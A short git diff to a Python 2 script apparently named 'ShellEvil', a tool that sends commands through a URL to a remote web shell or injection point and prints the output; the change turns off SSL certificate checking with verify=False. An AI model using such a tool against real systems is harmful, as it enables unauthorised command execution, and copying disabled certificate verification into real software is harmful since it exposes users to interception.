@@ -22,6 +22,9 @@ import readline
 author:jonatas fil a.k.a dkr
 '''
 
+# Disable SSL
+requests.packages.urllib3.disable_warnings()
+
 # ShellEvil 
 if len(sys.argv) == 2:
     target = sys.argv[1] # Payload
@@ -37,7 +40,7 @@ if len(sys.argv) == 2:
             sys.exit()
         try:
             headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"}
-            pwn=requests.get(first+cmd+second,headers = headers)
+            pwn=requests.get(first+cmd+second,headers = headers,verify=False) # Disable SSL
             if pwn.status_code == 200:
                 print pwn.content # 1337
             else:
